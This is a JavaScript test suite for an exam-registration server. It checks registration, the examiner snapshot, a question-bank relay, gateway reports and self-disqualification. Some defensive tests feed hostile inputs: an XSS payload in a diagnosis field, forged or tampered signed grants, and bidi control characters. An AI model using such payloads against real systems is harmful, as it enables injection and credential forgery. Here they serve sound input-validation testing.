  assert.equal(reply.resumed, undefined, 'there was nothing to resume');
  assert.ok(reply.examineeToken);
  assert.equal(e.rows('ממתינים').length, 2, 'the waiter registered normally');
  assert.equal(e.rows('ממתינים')[1][12], reply.examineeToken);
});

test("r32: 'pending' is never answered as a token", () => {
  const e = runtime({});
  const id = '900000512', key = 'ccccddddeeeeffff';
  e.ctx.claimRegistration(SESSION, id, key);
  // The claim is in the memo...
  assert.equal(e.cache.get(e.ctx.regKeyMemoKey(SESSION, id, key)), 'pending');
  // ...and the recall refuses to call it a token. Answering 'pending' as an
  // examineeToken would write it into column M and every later call would be
  // refused with 'טוקן נבחן לא תקין' — the exact shape of KNOWN_ISSUES #34.
  assert.equal(e.ctx.recallRegistrationToken(SESSION, id, key), '');
  const reply = registerAs(e, id, { regKey: key });
  assert.notEqual(reply.examineeToken, 'pending');
  assert.notEqual(e.rows('ממתינים')[1][12], 'pending');
});

test('r32: a refusal drops the claim, so the next attempt is not made to wait', () => {
  const e = runtime({});
  const id = '900000513';
  assert.equal(registerAs(e, id, { regKey: 'ddddeeeeffff0000' }).status, 'ok');
  // Another device (another regKey) is still told 'כבר רשום' — and the claim it
  // wrote before reading the sheet is gone, because it appended nothing.
  const other = registerAs(e, id, { regKey: 'eeeeffff00001111' });
  assert.match(other.message, /כבר רשום/);
  assert.equal(e.cache.get(e.ctx.regKeyMemoKey(SESSION, id, 'eeeeffff00001111')), null);
  let slept = 0;
  const realSleep = e.ctx.Utilities.sleep;
  e.ctx.Utilities.sleep = ms => { slept++; realSleep(ms); };
  assert.match(registerAs(e, id, { regKey: 'eeeeffff00001111' }).message, /כבר רשום/);
  e.ctx.Utilities.sleep = realSleep;
  assert.equal(slept, 0, 'the second attempt was answered at once, not after 25 s');
  assert.equal(e.rows('ממתינים').length, 2);
});

// ---- r32 (DESIGN §14.1): sessionSnapshot version 2 -------------------------
// The examiner board is drawn from the Worker's watch now — one Google round
// trip per change instead of two (KNOWN_ISSUES #35) — so this answer has to
// carry everything the board shows. It must carry it by EXACTLY the rules
// handleExaminerDashboard uses, or the two screens drift apart the day one of
// them changes. So the assertions below compare against the dashboard itself,
// on the same sheets, rather than against a hand-written expectation.
const SNAP_SESSION = 'SNAP0001';
const OTHER_SESSION = 'OTHER001';
const SNAP_RES_HEADER = ['תאריך', 'ת.ז.', 'שם', 'טלפון', 'דרגה', 'ציון', 'אחוז', 'עבר/נכשל', 'זמן', 'בוחן', 'אתר',
  'כיתה', 'שפה', 'קוד סשן', 'ניסיון', 'פירוט שגויות', 'נשלח?', 'פסול?', 'קישור וואטסאפ', 'אוכלוסיה', 'תוקן?', 'שמע',
  'מאומת', 'חשוד', 'dqEventId', 'תוקן ע"י', 'סיבת תיקון', 'תאריך תיקון', 'מסלול שפות', 'מכשיר'];
// Every one of the 19 ממתינים columns carries a DIFFERENT value, so a field
// read from the neighbouring column cannot pass.
function snapPendingRow(id, status, overrides) {
  const row = Array(19).fill('');
  row[0] = SNAP_SESSION; row[1] = id; row[2] = 'שם ' + id; row[3] = '05011' + id.slice(-5);
  row[4] = new Date(NOW - 1800000); row[5] = status; row[6] = 'ru'; row[7] = 'אזרחים'; row[8] = 'C1';
  row[9] = 'on'; row[10] = '1.25'; row[11] = ''; row[12] = 'tok-' + id; row[13] = 2; row[14] = 'כן';
  row[15] = 3; row[16] = 'החלפת חלון'; row[17] = 'בסיס 80'; row[18] = '';
  return Object.assign(row, overrides || {});
}
function snapResultRow(id, overrides) {
  const row = Array(30).fill('');
  row[0] = new Date(NOW - 3600000); row[1] = id; row[2] = 'שם ' + id; row[3] = '0509999999';
  row[4] = 'B'; row[5] = '27/30'; row[6] = '90%'; row[7] = 'עבר'; row[8] = "30 דק' 00 שנ'";
  row[9] = 'בוחן א'; row[10] = 'בסיס 80'; row[11] = 'כיתה 1'; row[12] = 'ru'; row[13] = SNAP_SESSION;
  row[14] = 1; row[15] = ''; row[16] = false; row[17] = false; row[18] = 'https://wa.me/x';
  row[19] = 'אזרחים'; row[20] = false; row[21] = 'on'; row[22] = 'מאומת'; row[23] = ''; row[29] = 'desktop';
  return Object.assign(row, overrides || {});
}
// waiting + in_exam + two finished examinees, one of whose results was
// superseded (latest wins) and one whose only result is a fabricated timeout
// fail; plus a SHORT row (13 columns, as an old sheet has) and a result written
// today in ANOTHER session, which is what attemptsToday/todayExams count.
const SNAP_PENDING = [
  snapPendingRow('900001001', 'waiting'),
  snapPendingRow('900001002', 'in_exam', { 11: new Date(NOW - 300000), 18: '2026-09-22T06:28:00Z' }),
  snapPendingRow('900001003', 'completed'),
  snapPendingRow('900001005', 'completed'),
  snapPendingRow('900001004', 'waiting').slice(0, 13)   // an old, narrow row
];
const SNAP_RESULTS = [
  snapResultRow('900001003', { 7: 'בוטל', 5: '10/30' }),                              // overturned: invisible
  snapResultRow('900001003', { 7: 'נכשל', 5: '20/30', 15: 'ניתוק/טיימאאוט — הנבחן לא סיים את המבחן' }),
  snapResultRow('900001003', { 14: 2, 15: 'מזהה שאלה: 17' }),                          // the LATEST row wins
  snapResultRow('900001005', { 7: 'נכשל', 5: '0/30', 15: 'סגירת דפדפן — המבחן נסגר' }),  // a fabricated fail
  snapResultRow('900001004', { 13: OTHER_SESSION, 4: 'C', 5: '29/30' }),                // today, another session
  snapResultRow('900001001', { 13: OTHER_SESSION, 0: new Date(NOW - 30 * 3600000) })    // yesterday
];
function snapshotEnv() {
  return createEnv({
    now: NOW,
    sheets: {
      'ממתינים': [PENDING_HEADER, ...SNAP_PENDING],
      'תוצאות': [SNAP_RES_HEADER, ...SNAP_RESULTS],
      'סשנים': [SESSIONS_HEADER, sessionRow({ 0: SNAP_SESSION })],
      'הארכות זמן': [['תאריך', 'קוד סשן', 'ת.ז.', 'שם', 'דקות', 'סיבה', 'בוחן']]
    },
    properties: Object.assign({}, GATEWAY_PROPS)
  });
}
const snapshotOf = e => e.json(e.ctx.handleSessionSnapshot({ sessionCode: SNAP_SESSION }));
const dashboardOf = e => e.json(e.ctx.handleExaminerDashboard({ sessionCode: SNAP_SESSION }));
const rowById = (rows, id) => rows.filter(r => r.id === id)[0];

test('r32: snapshot v2 reads every new row field from its own column', () => {
  const snap = snapshotOf(snapshotEnv());
  assert.equal(snap.status, 'ok');
  assert.equal(snap.v, 2, 'the Worker only forwards a v2 snapshot');
  assert.equal(snap.rows.length, 5);
  const waiting = rowById(snap.rows, '900001001');
  assert.deepEqual(waiting, {
    id: '900001001', status: 'waiting',
    tokenHash: require('node:crypto').createHash('sha256').update('tok-900001001').digest('hex'),
    audio: 'on', examMinutes: 50, extraMinutes: 0, warn: 3, fin: 0, ext: 1, dq: 2,
    name: 'שם 900001001', phone: '0501101001', time: new Date(NOW - 1800000).toISOString(), start: '',
    lang: 'ru', pop: 'אזרחים', site: 'בסיס 80', lic: 'C1', timeExt: '1.25', lastWarn: 'החלפת חלון',
    attemptsToday: 0
  });
  // The exam row: column L (start) and column S (finished on device) are set.
  const inExam = rowById(snap.rows, '900001002');
  assert.equal(inExam.start, new Date(NOW - 300000).toISOString());
  assert.equal(inExam.fin, 1);
  // The narrow row: the length guards answer '' instead of undefined, which
  // would vanish from the JSON and leave the board with a hole.
  const narrow = rowById(snap.rows, '900001004');
  assert.equal(narrow.site, '');
  assert.equal(narrow.lastWarn, '');
  assert.equal(narrow.start, '');
  assert.equal(narrow.warn, 0);
  // The token itself never leaves the script — only its SHA-256.
  assert.equal(JSON.stringify(snap).indexOf('tok-'), -1);
});

test('r32: attemptsToday and todayExams are the dashboard\'s own tallies', () => {
  const e = snapshotEnv();
  const snap = snapshotOf(e);
  const dash = dashboardOf(e);
  const boardItem = id => dash.pending.concat(dash.active).filter(x => String(x.idNumber) === id)[0];
  for (const row of snap.rows) {
    const item = boardItem(row.id);
    if (!item) continue;            // a finished row is not on either board list
    assert.equal(row.attemptsToday, item.attemptsToday, 'attemptsToday for ' + row.id);
    assert.deepEqual(row.todayExams, item.todayExams, 'todayExams for ' + row.id);
  }
  // ...and it is not vacuously zero: 900001004 sat an exam today in ANOTHER
  // session, which is exactly what the "second attempt today" flag is for.
  const repeat = rowById(snap.rows, '900001004');
  assert.equal(repeat.attemptsToday, 1);
  assert.deepEqual(repeat.todayExams, [{ license: 'C', score: '29/30', passed: 'עבר', language: 'ru' }]);
  // A row with nothing today carries no empty array at all.
  assert.equal(Object.prototype.hasOwnProperty.call(rowById(snap.rows, '900001001'), 'todayExams'), false,
    'yesterday\'s result is not today\'s');
});

test('r32: snapshot results are the dashboard\'s completed list, minus the blob plus `fabricated`', () => {
  const e = snapshotEnv();
  const snap = snapshotOf(e);
  const dash = dashboardOf(e);
  const FABRICATED = /סגירת דפדפן|טיימאאוט|סיום ידני/;
  // registrationTime is the one field the snapshot deliberately omits: the page
  // computes it from `rows` (the last ממתינים row of that id).
  const expected = dash.completed.map(item => {
    const copy = Object.assign({}, item);
    const wrong = String(copy.wrongDetails || '');
    delete copy.wrongDetails;
    delete copy.registrationTime;
    if (FABRICATED.test(wrong)) copy.fabricated = 1;
    return copy;
  });
  assert.deepEqual(snap.results, expected);
  assert.equal(snap.results.length, 2, 'two finished examinees, one row each');
  // The dedup rule the board uses: the LATEST non-בוטל row per examinee.
  const latest = snap.results.filter(r => String(r.idNumber) === '900001003')[0];
  assert.equal(latest.attempt, 2);
  assert.equal(latest.passed, 'עבר');
  assert.equal(latest.fabricated, undefined, 'a real result is not flagged');
  const fabricated = snap.results.filter(r => String(r.idNumber) === '900001005')[0];
  assert.equal(fabricated.fabricated, 1, 'a browser-close fail still says so without the blob');
  // The 2 KB blob is what this saves — it must not be in the answer under any name.
  const text = JSON.stringify(snap);
  assert.equal(text.indexOf('wrongDetails'), -1);
  assert.equal(text.indexOf('מזהה שאלה'), -1);
  assert.equal(text.indexOf('סגירת דפדפן'), -1);
});

// ============================================================================
// r33 (24/09/2026, KNOWN_ISSUES #38): the Google fallback of a phone that
// cannot reach the Worker. On 23/09 many phones registered through Google and
// then never made ONE request to the Worker; the page now notices and asks this
// script instead. The server's part: bankRelay (the texts, fetched from the
// Worker server to server with the phone's own grant), reportGateway (the '📡'
// on the examiner's row + the device's own diagnosis), the gwDiag of a
// registration made in the fallback, the self-DQ reason, and the operator's
// testGatewayReachability().
// ============================================================================

// UrlFetchApp is new to the server. This fake records every call and answers
// from respond(url, opts) — an Error is thrown, as UrlFetchApp throws. A test
// that must NOT fetch passes no responder.
function fetchSpy(e, respond) {
  const calls = [];
  e.ctx.UrlFetchApp = {
    fetch(url, opts) {
      calls.push({ url: String(url), opts });
      if (!respond) throw new Error('UrlFetchApp must not be called here');
      const answer = respond(String(url), opts);
      if (answer instanceof Error) throw answer;
      return { getResponseCode: () => answer.code, getContentText: () => answer.text };
    }
  };
  return calls;
}
// The shape of the Worker's /v1/bank body (tests/contracts.test.cjs takes it
// from the REAL Worker); Amharic too, so a text survives the relay whole.
const workerBank = ids => ({ status: 'ok', build: 'bank-test', missing: [],
  questions: ids.map(id => ({ id, l: { he: { t: 'שאלה ' + id, a: ['א', 'ב', 'ג', 'ד'] }, am: { t: 'ጥያቄ ' + id } } })) });
const relay = (e, n, grant, extra) => postJson(e, Object.assign({ action: 'bankRelay', sessionCode: SESSION,
  idNumber: idOf(n), examineeToken: 'token-' + idOf(n), grant }, extra || {}));

test('r33 bankRelay: the Worker\'s answer to the examinee\'s own grant comes back unchanged, plus relay:true', () => {
  const e = runtime({ ids: [idOf(1)] });
  const started = startExam(e, 1);
  assert.equal(started.status, 'ok');
  const ids = started.questions.map(q => q.id);
  const calls = fetchSpy(e, () => ({ code: 200, text: JSON.stringify(workerBank(ids)) }));
  e.logs.length = 0;
  const relayed = relay(e, 1, started.bank.grant);
  assert.deepEqual(relayed, Object.assign(workerBank(ids), { relay: true }), 'the Worker body, field for field, and the flag');
  assert.equal(calls.length, 1);
  assert.equal(calls[0].url, GATEWAY_URL + '/v1/bank?grant=' + encodeURIComponent(started.bank.grant));
  assert.equal(calls[0].opts.method, 'get');
  assert.equal(calls[0].opts.muteHttpExceptions, true);
  assert.equal(calls[0].opts.followRedirects, true);
  assert.equal(calls[0].opts.headers.Accept, 'application/json');
  assert.ok(e.logs.length > 0, 'the router logged the request');
  assert.ok(!e.logs.join('\n').includes(started.bank.grant.split('.')[1]), 'the grant is a credential: never logged');
  // A GATEWAY_URL saved with trailing slashes still makes one clean URL.
  e.properties.set('GATEWAY_URL', GATEWAY_URL + '//');
  assert.equal(relay(e, 1, started.bank.grant).status, 'ok');
  assert.equal(calls[1].url, GATEWAY_URL + '/v1/bank?grant=' + encodeURIComponent(started.bank.grant));
});

test('r33 bankRelay: anything but this examinee\'s live exam grant is grant_invalid, and nothing is fetched', () => {
  const e = runtime({ ids: [idOf(1), idOf(2)] });
  const mine = startExam(e, 1).bank.grant;
  const theirs = startExam(e, 2).bank.grant;
  const calls = fetchSpy(e, null);
  const sub = SESSION + ':' + idOf(1), exp = NOW + 3600000;
  const sign = (payload, key) => e.ctx.signBankGrant(payload, key);
  const forgedPayload = Buffer.from(JSON.stringify({ v: 1, s: 'exam', ids: [1], sub, exp })).toString('base64url');
  const notJson = Buffer.from('not json at all').toString('base64url');
  const macOf = text => require('node:crypto').createHmac('sha256', 'secret-key').update(text).digest('base64url');
  const cases = {
    'a bad signature': mine.slice(0, -1) + (mine.slice(-1) === 'A' ? 'B' : 'A'),
    'a payload edited after signing': forgedPayload + '.' + mine.split('.')[1],
    'another examinee\'s grant (wrong sub)': theirs,
    'the practice scope, same sub': sign({ v: 1, s: 'practice', ids: [1], sub, exp }),
    'the examiner scope': sign({ v: 1, s: 'examiner', sub, exp }),
    'another key': sign({ v: 1, s: 'exam', ids: [1], sub, exp }, 'another-key'),
    'version 2': sign({ v: 2, s: 'exam', ids: [1], sub, exp }),
    'no ids': sign({ v: 1, s: 'exam', ids: [], sub, exp }),
    'a signed payload that is not JSON': notJson + '.' + macOf(notJson),
    'three parts': mine + '.x',
    'longer than 4096': mine + 'A'.repeat(4097 - mine.length),
    'empty': '',
    'not a string': 12345,
    'absent': undefined
  };
  for (const [label, grant] of Object.entries(cases)) {
    e.clock.t += 31000;   // ten relays per five minutes: keep the loop under the limit
    const reply = relay(e, 1, grant);
    assert.equal(reply.status, 'error', label);
    assert.equal(reply.code, 'grant_invalid', label);
    assert.equal(reply.message, 'הרשאת השאלות אינה תקפה — נסה להתחיל שוב', label);
  }
  // The examinee's real grant, four hours and a second after it was issued.
  e.clock.t = NOW + 4 * 3600 * 1000 + 1000;
  assert.equal(relay(e, 1, mine).code, 'grant_invalid', 'expired');
  assert.equal(calls.length, 0, 'not one of them reached the Worker');
});

test('r33 bankRelay: blocked, broken or unreachable is relay_failed, retryable, and never echoes the grant', () => {
  const e = runtime({ ids: [idOf(1)] });
  const grant = startExam(e, 1).bank.grant;
  const cases = [
    ['Cloudflare 1010, the 23/09 suspect', { code: 403, text: 'error code: 1010' }, 403, 'error code: 1010'],
    ['a Cloudflare HTML block page', { code: 403, text: '<!DOCTYPE html><html><head><title>Attention Required! | Cloudflare</title></head><body><p>Sorry, you have been blocked</p><span>error code: 1020</span></body></html>' }, 403, 'error code: 1020'],
    ['HTML where JSON belongs', { code: 200, text: '<html><body>not the Worker</body></html>' }, 200, '<html><body>not the Worker</body></html>'],
    ['the Worker refusing the grant', { code: 403, text: '{"status":"error","code":"grant_invalid"}' }, 403, '{"status":"error","code":"grant_invalid"}'],
    ['the Worker without its bank', { code: 503, text: '{"status":"error","code":"bank_unavailable","retryable":true}' }, 503,
      '{"status":"error","code":"bank_unavailable","retryable":true}'],
    ['a 200 that is not a bank answer', { code: 200, text: '{"status":"ok","questions":"nope"}' }, 200, '{"status":"ok","questions":"nope"}'],
    ['an exception that quotes the URL', new Error('Address unavailable: ' + GATEWAY_URL + '/v1/bank?grant=' + grant), 0, null]
  ];
  for (const [label, answer, http, detail] of cases) {
    e.clock.t += 31000;
    fetchSpy(e, () => answer);
    const reply = relay(e, 1, grant);
    assert.equal(reply.status, 'error', label);
    assert.equal(reply.code, 'relay_failed', label);
    assert.equal(reply.http, http, label);
    assert.equal(reply.retryable, true, label);
    assert.equal(reply.message, 'לא הצלחנו לטעון את השאלות דרך השרת — נסה שוב או פנה לבוחן', label);
    assert.ok(typeof reply.detail === 'string' && reply.detail.length > 0 && reply.detail.length <= 80, label + ': ' + reply.detail);
    if (detail !== null) assert.equal(reply.detail, detail, label);
    for (const piece of grant.split('.')) assert.ok(!reply.detail.includes(piece.slice(0, 16)), label + ': the grant leaked into the detail');
  }
});

test('r33 bankRelay: POST only, the examinee token first, then ten per five minutes per examinee', () => {
  const e = runtime({ ids: [idOf(1), idOf(2)] });
  const grant1 = startExam(e, 1).bank.grant, grant2 = startExam(e, 2).bank.grant;
  const calls = fetchSpy(e, () => ({ code: 200, text: JSON.stringify(workerBank([1])) }));
  assert.equal(get(e, { action: 'bankRelay', sessionCode: SESSION, idNumber: idOf(1), examineeToken: 'token-' + idOf(1),
    grant: grant1 }).message, 'פעולה זו דורשת POST');
  assert.equal(relay(e, 1, grant1, { examineeToken: 'stolen' }).examineeTokenError, 'mismatch');
  assert.equal(relay(e, 1, grant1, { examineeToken: undefined }).examineeTokenError, 'missing');
  assert.equal(postJson(e, { action: 'bankRelay', sessionCode: SESSION, idNumber: '900000099', examineeToken: 'x',
    grant: grant1 }).examineeTokenError, 'not_found');
  assert.equal(calls.length, 0, 'a refused caller fetches nothing');
  for (let i = 0; i < 10; i++) assert.equal(relay(e, 1, grant1).status, 'ok', 'relay ' + (i + 1));
  const limited = relay(e, 1, grant1);
  assert.equal(limited.rateLimited, true);
  assert.ok(limited.waitSec > 0 && limited.waitSec <= 300, 'waitSec=' + limited.waitSec);
  assert.equal(calls.length, 10, 'the refused eleventh fetched nothing');
  assert.equal(relay(e, 2, grant2).status, 'ok', 'another examinee has his own ten');
  e.clock.t += 301 * 1000;
  assert.equal(relay(e, 1, grant1).status, 'ok', 'five minutes later the window has moved on');
  const spec = e.ctx.apiRegistry().bankRelay;
  assert.equal(spec.methods.join(','), 'POST');
  assert.equal(spec.auth, 'examinee');
  assert.equal(spec.rateLimit.max, 10);
  assert.equal(spec.rateLimit.windowSec, 300);
  assert.equal(spec.rateLimit.id({ sessionCode: SESSION, idNumber: '1' }), spec.rateLimit.id({ sessionCode: SESSION, idNumber: '000000001' }));
});

test('r33 bankRelay: without GATEWAY_URL it is the administrator\'s problem; without the key no grant is valid', () => {
  const e = runtime({ ids: [idOf(1)] });
  const grant = startExam(e, 1).bank.grant;
  const calls = fetchSpy(e, null);
  e.properties.delete('GATEWAY_URL');
  const unset = relay(e, 1, grant);
  assert.equal(unset.code, 'bank_not_configured');
  assert.equal(unset.message, 'מאגר השאלות אינו מוגדר בשרת — פנה למנהל המערכת');
  e.properties.set('GATEWAY_URL', GATEWAY_URL);
  e.properties.delete('GATEWAY_KEY');
  assert.equal(relay(e, 1, grant).code, 'grant_invalid', 'nothing can be verified without the key');
  assert.equal(calls.length, 0);
});

const report = (e, n, body) => postJson(e, Object.assign({ action: 'reportGateway', sessionCode: SESSION,
  idNumber: idOf(n), examineeToken: 'token-' + idOf(n) }, body || {}));
// What examinee.html gwDiagString sends: no personal data, OS + browser only.
const GW_DIAG = 'v1|why=probe|e=TypeError:Failed to fetch|t=network|ms=9500|trace=none|os=Android14|br=Chrome/128.0.0.0|on=1';
const clientRows = e => e.rows('אבחון').filter(r => r[1] === 'CLIENT');

test('r33 reportGateway: column Q says 📡, the warning counter P is never touched, the diagnosis lands in אבחון', () => {
  const e = runtime({ sheets: { 'ממתינים': [PENDING_HEADER, pendingRow(idOf(1), { 5: 'in_exam', 15: 2, 16: 'יצא מהמסך' })] } });
  e.resetCounters();
  assert.deepEqual(report(e, 1, { mode: 'google', diag: GW_DIAG }), { status: 'ok' });
  const row = () => e.rows('ממתינים')[1];
  assert.equal(row()[16], '📡 גיבוי גוגל (probe)');
  assert.equal(row()[15], 2, 'P counts anti-cheat warnings — a gateway report is not one');
  assert.equal(row()[5], 'in_exam', 'nor is the status touched');
  const c = e.counters().perSheet['ממתינים'];
  assert.equal(c.setValues, 1, 'ONE cell written');
  assert.equal(c.fullReads + c.rangeReads, 1, 'the auth check\'s read, handed forward — no second read');
  const logged = clientRows(e);
  assert.equal(logged.length, 1);
  assert.equal(logged[0][2], SESSION);
  assert.equal(logged[0][3], idOf(1));
  assert.deepEqual(JSON.parse(logged[0][6]).map(x => [x.e, x.m, x.d]), [['gw', 'google', GW_DIAG]]);

  // Back on the Worker: the same cell, the other label.
  assert.deepEqual(report(e, 1, { mode: 'worker', diag: 'v1|why=reprobe|os=Android14' }), { status: 'ok' });
  assert.equal(row()[16], '📡 חזר ל-Worker (reprobe)');
  assert.equal(row()[15], 2);
  // The same report again writes nothing.
  e.resetCounters();
  report(e, 1, { mode: 'worker', diag: 'v1|why=reprobe|os=Android14' });
  assert.equal(e.counters().perSheet['ממתינים'].setValues, 0, 'no write for a cell that already says it');
});

test('r33 reportGateway: only a live row is marked, and the label is ours — never the device\'s text', () => {
  const rows = [
    pendingRow(idOf(1), { 5: 'waiting' }), pendingRow(idOf(2), { 5: 'approved' }), pendingRow(idOf(3), { 5: 'in_exam' }),
    pendingRow(idOf(4), { 5: 'completed', 16: 'x' }), pendingRow(idOf(5), { 5: 'disqualified', 16: 'פסילה: split-area' })
  ];
  const e = runtime({ sheets: { 'ממתינים': [PENDING_HEADER, ...rows] } });
  for (const n of [1, 2, 3]) {
    assert.deepEqual(report(e, n, { mode: 'google', diag: 'v1|why=poll' }), { status: 'ok' });
    assert.equal(e.rows('ממתינים')[n][16], '📡 גיבוי גוגל (poll)', 'status ' + rows[n - 1][5]);
  }
  for (const n of [4, 5]) {
    assert.deepEqual(report(e, n, { mode: 'google', diag: 'v1|why=poll' }), { status: 'ok' }, 'best effort: still ok');
    assert.equal(e.rows('ממתינים')[n][16], rows[n - 1][16], 'a finished or disqualified row keeps its own line');
  }
  // A why that is not a short token is left out; markup never reaches the cell.
  report(e, 1, { mode: 'google', diag: 'v1|why=<img src=x onerror=alert(1)>' });
  assert.equal(e.rows('ממתינים')[1][16], '📡 גיבוי גוגל');
  report(e, 1, { mode: 'google', diag: 'why=' + 'a'.repeat(60) });
  assert.ok(e.rows('ממתינים')[1][16].length <= 40, e.rows('ממתינים')[1][16]);
  // An unknown mode writes nothing, and is kept as 'unknown', not as its text.
  report(e, 2, { mode: 'GOOGLE!!', diag: 'v1|why=odd' });
  assert.equal(e.rows('ממתינים')[2][16], '📡 גיבוי גוגל (poll)');
  assert.deepEqual(JSON.parse(clientRows(e).at(-1)[6]).map(x => [x.m, x.d]), [['unknown', 'v1|why=odd']]);
  // No diagnosis: nothing appended to אבחון, and the label carries no reason.
  const before = clientRows(e).length;
  report(e, 3, { mode: 'worker' });
  assert.equal(e.rows('ממתינים')[3][16], '📡 חזר ל-Worker');
  assert.equal(clientRows(e).length, before);
});

test('r33 reportGateway: the diagnosis is cleaned and capped; a wrong token keeps nothing; POST, twenty per ten minutes', () => {
  const e = runtime({ sheets: { 'ממתינים': [PENDING_HEADER, pendingRow(idOf(1), { 5: 'in_exam' })] } });
  report(e, 1, { mode: 'google', diag: 'v1|why=probe\r\n\u0007\u202Eevil|' + 'x'.repeat(400) });
  const kept = JSON.parse(clientRows(e).at(-1)[6])[0].d;
  assert.ok(kept.length <= 300, 'capped: ' + kept.length);
  assert.ok(!/[\u0000-\u001F\u007F\u202E]/.test(kept), 'no control or bidi character survives');
  assert.ok(kept.startsWith('v1|why=probe'), kept.slice(0, 30));
  const rowsBefore = clientRows(e).length;
  const refused = report(e, 1, { mode: 'google', diag: 'v1|why=probe', examineeToken: 'stolen' });
  assert.equal(refused.examineeTokenError, 'mismatch');
  assert.equal(clientRows(e).length, rowsBefore, 'a caller without the token leaves no trace');
  assert.match(get(e, { action: 'reportGateway', sessionCode: SESSION, idNumber: idOf(1), examineeToken: 'token-' + idOf(1) }).message, /דורשת POST/);
  let ok = 1;   // the first report above
  for (let i = 0; i < 30; i++) if (report(e, 1, { mode: 'google' }).status === 'ok') ok++;
  assert.equal(ok, 20, 'twenty reports per ten minutes per examinee');
  const spec = e.ctx.apiRegistry().reportGateway;
  assert.equal(spec.auth, 'examinee');
  assert.equal(spec.methods.join(','), 'POST');
  assert.equal(spec.rateLimit.max, 20);
  assert.equal(spec.rateLimit.windowSec, 600);
});

test('r33 registerExaminee: a registration made in the fallback is born with 📡 in column Q', () => {
  const e = runtime({});
  const first = registerAs(e, '900000701', { regKey: 'gwfallback000001', gwDiag: GW_DIAG });
  assert.equal(first.status, 'ok');
  const row = e.rows('ממתינים')[1];
  assert.equal(row[16], '📡 גיבוי גוגל');
  assert.equal(row[15], 0, 'the warning counter starts at 0 as always');
  assert.equal(row[12], first.examineeToken);
  const logged = clientRows(e);
  assert.equal(logged.length, 1);
  assert.deepEqual(JSON.parse(logged[0][6]).map(x => [x.e, x.m, x.d]), [['gw', 'register', GW_DIAG]]);
  // The same device's retry resumes the row: nothing appended, nothing logged twice.
  const retry = registerAs(e, '900000701', { regKey: 'gwfallback000001', gwDiag: GW_DIAG });
  assert.equal(retry.resumed, true);
  assert.equal(retry.examineeToken, first.examineeToken);
  assert.equal(e.rows('ממתינים').length, 2);
  assert.equal(clientRows(e).length, 1);
  // Without a diagnosis Q stays empty — and '', 'undefined' and 'null' are no diagnosis.
  const plainRegistrations = { '900000702': {}, '900000703': { gwDiag: '' }, '900000704': { gwDiag: 'undefined' }, '900000705': { gwDiag: 'null' } };
  for (const [id, extra] of Object.entries(plainRegistrations)) {
    assert.equal(registerAs(e, id, extra).status, 'ok', id);
    assert.equal(e.rows('ממתינים').at(-1)[16], '', id + ' carries no badge');
  }
  assert.equal(clientRows(e).length, 1, 'and nothing more was logged');
});

const selfDq = (e, n, extra) => postJson(e, Object.assign({ action: 'disqualify', sessionCode: SESSION, idNumber: idOf(n),
  examineeToken: 'token-' + idOf(n), dqEventId: 'ev-' + n }, extra || {}));
const dqRows = (e, n) => e.rows('תוצאות').filter(r => String(r[1]) === idOf(n) && r[7] === 'פסול');

test('r33 disqualify: the detector that fired reaches column Q as "פסילה: <reason>"', () => {
  const e = runtime({ sheets: { 'ממתינים': [PENDING_HEADER, pendingRow(idOf(1), { 5: 'in_exam', 15: 1, 16: 'יצא מהמסך' })] } });
  assert.equal(selfDq(e, 1, { reason: 'split-area' }).status, 'ok');
  const row = e.rows('ממתינים')[1];
  assert.equal(row[5], 'disqualified');
  assert.equal(row[13], 1, 'the DQ counter as before');
  assert.equal(row[15], 1, 'the warning counter untouched');
  assert.equal(row[16], 'פסילה: split-area');
  const results = dqRows(e, 1);
  assert.equal(results.length, 1);
  assert.equal(results[0][23], '', 'column X (חשוד) is not this feature\'s');
  assert.equal(results[0][24], 'ev-1');
  // A second beacon of the same event is still ONE result row.
  assert.equal(selfDq(e, 1, { reason: 'split-area' }).status, 'ok');
  assert.equal(dqRows(e, 1).length, 1, 'dqEventId idempotency unchanged');
  assert.equal(e.rows('ממתינים')[1][16], 'פסילה: split-area');
  // Every reason examinee.html sends passes the rule unchanged.
  for (const reason of ['hidden-final', 'hidden-10s', 'hidden-5s', 'fullscreen-exit', 'fullscreen-prompt', 'zoom-out',
    'split-start', 'split-area', 'split-resize', 'blur-hidden-final', 'blur-hidden-10s', 'blur-hidden-5s']) {
    assert.equal(e.ctx.selfDqReason(reason), reason);
  }
});

test('r33 disqualify: a malformed reason, or an examiner\'s DQ, leaves column Q alone', () => {
  const examiners = [Array(11).fill('h'),
    ['בוחן', '111111111', 'pw', 'כן', '7', 'בוחן', 'tokE', new Date(NOW + 86400000).toISOString(), 0, '', '']];
  const e = runtime({ sheets: { 'בוחנים': examiners, 'ממתינים': [PENDING_HEADER,
    pendingRow(idOf(1), { 5: 'in_exam', 16: 'יצא מהמסך' }), pendingRow(idOf(2), { 5: 'in_exam', 16: 'יצא מהמסך' })] } });
  let event = 0;
  for (const reason of ['Split-Area', 'split area', '<b>x</b>', 'x'.repeat(25), '', 'פסילה', null]) {
    assert.equal(selfDq(e, 1, { reason, dqEventId: 'bad-' + (++event) }).status, 'ok', JSON.stringify(reason));
    assert.equal(e.rows('ממתינים')[1][16], 'יצא מהמסך', JSON.stringify(reason) + ' must not be written');
    assert.equal(e.rows('ממתינים')[1][5], 'disqualified', 'the disqualification itself still happens');
  }
  const byExaminer = postJson(e, { action: 'disqualify', origin: 'examiner-app', sessionCode: SESSION, idNumber: idOf(2),
    examinerId: '111111111', token: 'tokE', reason: 'split-area', dqEventId: 'ex-1' });
  assert.equal(byExaminer.status, 'ok');
  assert.equal(e.rows('ממתינים')[2][5], 'disqualified');
  assert.equal(e.rows('ממתינים')[2][16], 'יצא מהמסך', 'the reason is the device\'s — an examiner DQ carries none');
});

// r34 (24/09/2026, KNOWN_ISSUES #40): the examinee page now RETRIES a self-DQ
// until the server answers. A retry of an event the server already has must
// change nothing — not the DQ counter when only the answer was lost (#35), and
// above all not the row when the examiner has overturned it in the meantime.
test('r34 disqualify: a retry of a DQ the server already has changes nothing — not even after an overturn', () => {
  const examiners = [Array(11).fill('h'),
    ['בוחן', '111111111', 'pw', 'כן', '7', 'בוחן', 'tokE', new Date(NOW + 86400000).toISOString(), 0, '', '']];
  const e = runtime({ sheets: { 'בוחנים': examiners, 'ממתינים': [PENDING_HEADER, pendingRow(idOf(1), { 5: 'in_exam' })] } });
  const pending = () => e.rows('ממתינים')[1];
  assert.equal(selfDq(e, 1, { reason: 'hidden-10s' }).status, 'ok');
  assert.equal(pending()[5], 'disqualified');
  assert.equal(pending()[13], 1);

  // Google lost the answer; the page sends the same event again.
  const again = selfDq(e, 1, { reason: 'hidden-10s' });
  assert.equal(again.status, 'ok');
